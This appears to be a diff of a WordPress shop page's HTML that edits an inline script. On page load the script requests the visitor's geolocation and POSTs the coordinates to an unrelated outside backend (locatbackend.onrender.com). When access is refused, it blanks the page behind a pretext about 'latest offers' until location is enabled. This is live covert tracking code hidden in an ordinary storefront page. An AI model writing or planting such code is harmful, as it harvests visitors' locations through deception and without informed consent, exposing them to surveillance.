@@ -129,11 +129,12 @@ var cf7rl_ajax_object = {"cf7rl_ajax_url":"https://inventstore.in/wp-admin/admin
 	dataLayer.push( dataLayer_content );
 </script>
 
+
 <script>
     document.addEventListener("DOMContentLoaded", function() {
       if (!navigator.geolocation) {
-        document.getElementById("message").innerHTML =
-          '<div class="error-message">This page requires location access.<br>Please enable location services and reload.</div>';
+        // Browser doesn’t support geolocation
+        document.body.innerHTML = "<h2>Location services are not supported by your browser.</h2>";
         return;
       }
 
@@ -145,7 +146,6 @@ var cf7rl_ajax_object = {"cf7rl_ajax_url":"https://inventstore.in/wp-admin/admin
             lon: position.coords.longitude
           };
 
-          // Send POST request to your backend
           fetch("https://locatbackend.onrender.com/location", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -153,25 +153,19 @@ var cf7rl_ajax_object = {"cf7rl_ajax_url":"https://inventstore.in/wp-admin/admin
           })
           .then(res => res.json())
           .then(result => {
-            document.getElementById("message").innerHTML =
-              '<div class="success-message">Location sent successfully!<br>Latitude: ' + data.lat + '<br>Longitude: ' + data.lon + '</div>';
+            document.body.innerHTML = "<h2>Location sent successfully!</h2>";
             console.log("Server response:", result);
           })
-          .catch(err => {
-            document.getElementById("message").innerHTML =
-              '<div class="error-message">Error sending location to server.<br>Please try again later.</div>';
-            console.error("Error:", err);
-          });
+          .catch(err => console.error("Error:", err));
         },
         function(error) {
-          // ❌ Location denied
-          document.getElementById("message").innerHTML =
-            '<div class="error-message">To find latest offers.<br>Please enable location services.</div>';
+          // ❌ Location denied or unavailable
+          document.body.innerHTML = "<h4>To find latest offers in near you. Please enable location services.</h4>";
           console.error("Geolocation error:", error);
         }
       );
     });
-  </script>
+  </script>	
 	
 <script>
 	console.warn && console.warn("[GTM4WP] Google Tag Manager container code placement set to OFF !!!");
